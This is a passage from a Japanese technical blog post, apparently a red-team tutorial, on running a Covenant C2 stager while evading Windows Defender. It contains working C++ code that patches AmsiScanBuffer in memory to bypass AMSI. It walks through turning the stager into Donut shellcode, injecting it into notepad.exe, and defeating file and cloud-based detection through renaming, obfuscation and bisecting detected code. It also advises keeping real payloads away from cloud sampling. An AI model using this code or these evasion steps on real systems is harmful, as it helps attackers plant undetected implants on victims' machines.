&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;hr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pClrRuntimeHost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ExecuteInDefaultAppDomain&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;sa&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;C:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;Downloads&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;GruntHTTP.exe&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 実行したい .NET アセンブリ
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;sa&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;GruntStager.GruntStager&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;sa&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;HostingExecute&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;sa&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pReturnValue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(..&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;snip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;..)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;AMSIバイパスの検証のため、ファイルはWindows Defenderの例外に設定しています。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;実行結果。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/callnet_amsi_detected.png&#34; alt=&#34;callnet_amsi_detected&#34;&gt;
&lt;/p&gt;
&lt;p&gt;AMSI に検知されました。あれ？アンマネージドコードなのになぜAMSIで検知しているのかって？&lt;/p&gt;
&lt;p&gt;例外をよく見てください。例外を発生させているのは、CLRを読み込んだあと呼び出されたCovenantのStagerです。Stagerがサーバからペイロードをダウンロードしメモリに読み込むためにAssembly.Load() を呼び出したとき、検知しています。当然この領域は既に .NET 範囲内なのでAMSIが動きます。&lt;/p&gt;
&lt;p&gt;ここで、ExecuteInDefaultAppDomain()を呼ぶ前にアンマネージドコード側でAMSIバイパスを行ってみましょう。&lt;/p&gt;
&lt;p&gt;以下のコードになります。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;PatchAMSI&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Patch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xb8\x57\x00\x07\x80\xc3&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// mov    eax,0x80070057 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;                                                        &lt;span class=&#34;c1&#34;&gt;// ret
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AmsiScanBuffer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;GetProcAddress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LoadLibrary&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;AMSI.DLL&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;AmsiScanBuffer&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AmsiScanBuffer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;[+] AmsiScanBuffer Address: %p&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AmsiScanBuffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;oldProt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;oldOldProt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;VirtualProtect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AmsiScanBuffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Patch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PAGE_EXECUTE_READWRITE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;oldProt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;memcpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AmsiScanBuffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Patch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Patch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;[+] AmsiScanBuffer patch copied!&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;n&#34;&gt;VirtualProtect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AmsiScanBuffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;oldProt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;oldOldProt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;[!] Failed copying the patch to AmsiScanBuffer!&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;検知される場合はprintfの削除や難読化など検知回避を施してください&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;C# 製のAMSIScanBufferBypassと同じ原理です。CLRが読み込まれると amsi.dll もついでに呼ばれるので、先に amsi.dll を読んでパッチしておく作戦です。&lt;/p&gt;
&lt;p&gt;これをmainの最初で&lt;code&gt;PatchAMSI()&lt;/code&gt;を呼ぶようにコードを変更し、再度コンパイルし実行してみます。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/callnet_amsi_bypass.png&#34; alt=&#34;callnet_amsi_bypass&#34;&gt;
&lt;/p&gt;
&lt;p&gt;AMSI バイパスを行ったので問題なくGruntが動作しました。&lt;/p&gt;
&lt;p&gt;以上、アンマネージドコードでAMSIバイパスを行ったうえで .NET アセンブリを実行することに成功しました。今回は説明を楽にするために読み込むStagerをそのままディスク上に保存していましたが、本来なら暗号化・難読化したうえでファイル内に埋め込んだり（&lt;a href=&#34;https://www.ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources&#34;&gt;リソースファイルとしてローダー内に含める例&lt;/a&gt;）、本記事で紹介したように外部サーバから読み込むべきです。&lt;/p&gt;
&lt;h1 id=&#34;donut--ローダでstager起動&#34;&gt;Donut + ローダでStager起動&lt;/h1&gt;
&lt;p&gt;本記事の総まとめとして、Donutを使ってWindows Defenderに検知されないバイナリを作成しましょう。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/TheWover/donut&#34;&gt;Donut&lt;/a&gt; は .NET アセンブリをはじめとする複数のランタイムをネイティブなシェルコード化するプログラムです。&lt;/p&gt;
&lt;p&gt;.NET アセンブリを読み込む技術的仕組みはCLRを読み込む前項のPoCと同じですが、&lt;strong&gt;ペイロードの圧縮・暗号化・AMSIバイパス&lt;/strong&gt;の機能も内包しています。AMSIバイパス機能があり、バイパスコードも暗号化されるのでAMSIの検知を回避してバイパスをしてくれます。こちらでわざわざAMSIバイパスを行う必要がないということです。&lt;/p&gt;
&lt;p&gt;他にもペイロードをCLRに読み込んだあとに元のリソースをメモリから消去しメモリスキャンを回避させたり、AppDomainの名前をランダマイズ化する機能もあったりして、Donutによって生成されたシェルコードはアンチウイルスソフトの検知回避も期待できます。&lt;/p&gt;
&lt;p&gt;なおDonutを利用して生成したシェルコードはPIC (位置独立コード) になっているため、一般的なシェルコードローダを利用してローカルおよびリモートプロセスにインジェクション可能です。&lt;/p&gt;
&lt;h2 id=&#34;シェルコード作成&#34;&gt;シェルコード作成&lt;/h2&gt;
&lt;p&gt;早速Donutを使ってStagerをシェルコード化します。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/donut.png&#34; alt=&#34;donut&#34;&gt;
&lt;/p&gt;
&lt;p&gt;Donut に対して .NET アセンブリであるCovenant Stagerを入力するとネイティブなシェルコードが出力されます。オプションを指定しない場合、出力ログにあるようなオプションが適用されます。&lt;/p&gt;
&lt;h4 id=&#34;covenantのshellcode-launcher&#34;&gt;CovenantのShellCode Launcher&lt;/h4&gt;
&lt;p&gt;Covenant v0.6 でShellCode Launcherが実装されました。これはCovenantサーバ内部のDonutライブラリでStagerをシェルコード化しダウンロードできる機能です。Stagerをシェルコード化したいだけならこれを使うのもよいでしょう。&lt;/p&gt;
&lt;h2 id=&#34;ローダ&#34;&gt;ローダ&lt;/h2&gt;
&lt;p&gt;次にローダを書きます。Donutには .NET 製のローダであるDonutTestが同梱されています。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;本来なら.NET製ではなくアンマネージドコードでローダを書く方がいいのですが、記事が長くなるので今回は割愛します。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ローダは仕組み上コンパイルしたら間違いなく検知されそうなコードなので、まずはDonutフォルダをアンチウイルスソフトの例外に入れておきましょう。&lt;/p&gt;
&lt;p&gt;DonutTest はコード内にBaset64エンコード化されたシェルコードを記載することで、その変数をデコードして、コマンドライン引数で指定したプロセスのメモリ上にPEインジェクションします。インジェクション後、CreateRemoteThread() を使って該当のルーチンを呼び出します。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/donuttest.png&#34; alt=&#34;donuttest&#34;&gt;
&lt;/p&gt;
&lt;p&gt;Donut で出力したシェルコードは、デフォルトではx86/x64両対応のコードになります。よってx64変数、x86変数で同じシェルコードを利用します。&lt;/p&gt;
&lt;p&gt;まずはシェルコードをBase64エンコードします。PowerShellでエンコード化する場合は以下。クリップボードにコピーされます。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filename&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;loader.bin&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;[Convert]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ToBase64String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;[IO.File]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ReadAllBytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;clip&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;donutの -f 2オプションを適用することで、最初からBase64エンコード化されたシェルコードを出力することもできます。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;コード内に張り付けた後、コンパイル。まずはAMSIバイパスの効果を確認するため、リアルタイムスキャンをオンにして実行します。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/donutest_notepad.png&#34; alt=&#34;donutest_notepad&#34;&gt;
&lt;/p&gt;
&lt;p&gt;引数はインジェクション先のプロセスIDを指定します。今回は notepad.exe に対してプロセスインジェクションしました。すると問題なくGruntがアクティベートされました。ProcessHackerで notepad.exe を確認すると、メモ帳にもかかわらず .NETアセンブリが読み込まれています。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;メモ帳はアンマネージドコードのプログラムなので、インジェクションすると不審性が高まります。この場合はインジェクションする先のプロセスを .NET 製のものにすることで、アンマネージドコードが突然CLRを読み込むような不審性が現れなくなります。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;ファイルスキャンの検知回避&#34;&gt;ファイルスキャンの検知回避&lt;/h2&gt;
&lt;p&gt;それでは次にファイルスキャンの検知回避です。まずは作成した DonutTest.exe の検知テストをThreatCheckで行いましょう。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/donuttest_detect.png&#34; alt=&#34;donuttest_detect&#34;&gt;
&lt;/p&gt;
&lt;p&gt;検知されます。ちなみに検知名は「VirTool:MSIL/DLoader.A!MTB」です。DLoader、つまりDonutのローダであるDonutTestを決め打ちで検知するようになっているようです。おおかたDonutTestやShellcodeTestなどのDonutTest特有の文字列で検知しているのでしょう。&lt;/p&gt;
&lt;p&gt;まずはVisualStudioのプロパティからそのあたりのリソース情報を変更します。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/change_resource.png&#34; alt=&#34;change_resource&#34;&gt;
&lt;/p&gt;
&lt;p&gt;コンパイルし、再度確認します。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/donuttest_detect2.png&#34; alt=&#34;donuttest_detect2&#34;&gt;
&lt;/p&gt;
&lt;p&gt;ああ、まだ検知されました。恐らくメソッド名などの情報です。これらのコードの変更が面倒ですか？そんなときに楽なのがConfuserEx。難読化してもう一度スキャンしてみます。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;※ConfuserExは前述のとおり難がありますが、それを身をもって知るために試してみましょう&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ConfuserEx で難読化。難読化設定はrenameだけで問題ありません。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/donutest_file_notdetect.png&#34; alt=&#34;donutest_file_notdetect&#34;&gt;
&lt;/p&gt;
&lt;p&gt;検知しなくなりました。バイナリを例外フォルダから移動してもよさそうですが・・・？&lt;/p&gt;
&lt;h2 id=&#34;クラウド提供の保護の検知回避&#34;&gt;「クラウド提供の保護」の検知回避&lt;/h2&gt;
&lt;p&gt;次に「クラウド提供の保護」と「サンプルの自動送信」を有効にしてファイルを移動し、実行してみましょう。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/donuttest_cloud_detect.png&#34; alt=&#34;donuttest_cloud_detect&#34;&gt;
&lt;/p&gt;
&lt;p&gt;検知されてしまいました。「クラウド保護」はプログラム実行時にキックされ、実行前にファイルをMicrosoftのクラウドに送信し、マルウェアスキャンが行われます。クラウド上のスキャンエンジンで問題ないと判断された場合はそのまま実行されますが、このように検知された場合は「指定されたプログラムは実行できません。」というエラーが発生します。それと同時にWindows Defenderによる通知がなされます。&lt;/p&gt;
&lt;p&gt;さらにクラウド保護で検知されたファイルはエンジンでシグネチャが作成され、&lt;strong&gt;ファイルに含まれていた文字列、つまりシェルコードなども次回から文字列単体で検知するようになります&lt;/strong&gt;。いったん検知された場合は、しばらくの間、問答無用で検知されるようになります（一定期間たてば単なる文字列は検知対象外に戻る模様）。&lt;/p&gt;
&lt;p&gt;よって、&lt;strong&gt;「クラウド保護」および「ファイル送信」の検知テストは基本的に検知テスト用バイナリで行うべき&lt;/strong&gt;で、本番で使うリソースは大事にとっておいた方がいいです。&lt;/p&gt;
&lt;p&gt;注意点を書いたところで、検知回避を試してみましょう。上のとおり、今までのシェルコードは検知されてしまうので、Base64シェルコードの部分は検知回避ができることを確認するまでは適当なBase64文字列にしておけばいいです。&lt;/p&gt;
&lt;p&gt;さて、クラウド保護はクラウド上にエンジンがある関係上ブラックボックスであり、検知回避するためには少し泥臭いことをする必要があります。まずコードを全面的にコメントアウトしてから少しずつコメントインしてクラウドスキャンを行い、検知箇所を特定する作業です。&lt;/p&gt;
&lt;p&gt;というわけで思い切って大部分をコメントアウトしました。実際に使われているコードだけを抜き出すと以下になります。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/confuser_cloud_detect.png&#34; alt=&#34;confuser_cloud_detect&#34;&gt;
&lt;/p&gt;
&lt;p&gt;プロセスインジェクションを行うための2つのAPI宣言のみです。これをConfuserExで難読化して、再度検知テストしましょう。どうでしたか？&lt;strong&gt;実はこれだけでも検知するのです。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;DllImportを使ったAPI宣言は仕組み上、ConfuserExを使ってもそれをバイナリから隠蔽することはできません。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/confuser_dllimport.png&#34; alt=&#34;confuser_dllimport&#34;&gt;
&lt;/p&gt;
&lt;p&gt;ただプロセスインジェクションにはこのWin32APIの呼び出しは必須です。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;このDllImportの参照は、P/Invokeと呼ばれる参照方法です。D/InvokeやネイティブAPIなど別の呼び出しを使う方法もあります（詳細は割愛）。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ではこれ以上どうすればいいでしょうか。どうしようもない？いいえ、まだ減らすポイントがあります。ConfuserExです。&lt;/p&gt;
&lt;h3 id=&#34;confuserexの罠&#34;&gt;ConfuserExの罠&lt;/h3&gt;
&lt;p&gt;ConfuserEx は既存コードの特徴の痕跡を手っ取り早く消し去るのに有用ですが、継続した利用には注意が必要です。&lt;/p&gt;
&lt;p&gt;というのも攻撃者やRed TeamerがConfuserExを利用したバイナリで侵害を行いそれをアンチウイルスソフトに検知された場合、Windows Defenderの学習によって今後クラウド保護機能でConfuserExを利用したバイナリが検知されるようになるからです。私が検証した限り、上記の単純なAPI定義コード2つ + ConfuserEx 1.4.1 の組み合わせは、クラウド保護では「Trojan:Win32/Wacatac.C!ml」として検知します。&lt;/p&gt;
&lt;p&gt;ConfuserExを通さずに検知テストしてみてください。そう、このコードは&lt;strong&gt;ConfuserEx を使わなければクラウド保護では検知しなくなるのです。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;このことからConfuserExは銀の弾丸ではないとわかります。アンチウイルスソフトといたちごっこを続けるのもいいですが、可能ならConfuserExを使わずに自分でオリジナルのカスタムローダを作成して利用するのが望ましいでしょう。ローダさえ検知回避できればそこから先、AMSIバイパスをすればいいだけですから。&lt;/p&gt;
&lt;h3 id=&#34;confuserexを使わずdonuttestの痕跡を削除する&#34;&gt;ConfuserExを使わずDonutTestの痕跡を削除する&lt;/h3&gt;
&lt;p&gt;基本に立ち返ってコード上からDonutTestの痕跡を削除しましょう。記事の途中で行ったアセンブリ情報の変更のほか、基本的にはメソッド名やクラス名などの名前情報の変更が必要です。.NET プログラムはコンパイルでCILに変換されたあとでもこれらの名前情報は残ります。よってリネームを行って完全に痕跡を削除します。&lt;/p&gt;
